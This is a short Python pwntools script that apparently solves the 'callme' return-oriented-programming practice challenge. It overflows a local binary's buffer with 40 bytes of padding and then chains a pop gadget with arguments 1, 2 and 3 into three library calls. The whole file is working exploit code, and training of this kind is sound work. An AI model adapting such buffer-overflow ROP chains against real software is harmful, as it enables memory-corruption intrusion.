from pwn import *
import struct

p = process('./callme')

callme_one = struct.pack("<Q",0x401850)
callme_two = struct.pack("<Q",0x401870)
callme_three = struct.pack("<Q",0x401810)

gadget = struct.pack("<Q",0x401ab0)

argument1 = struct.pack("<Q",0x1)
argument2 = struct.pack("<Q",0x2)
argument3 = struct.pack("<Q",0x3)

gadget_args = gadget + argument1 + argument2 + argument3

pattern = 'A'*40 + gadget_args  + callme_one + gadget_args + callme_two + gadget_args + callme_three 

p.recvuntil('> ')

p.sendline(pattern)
p.interactive()
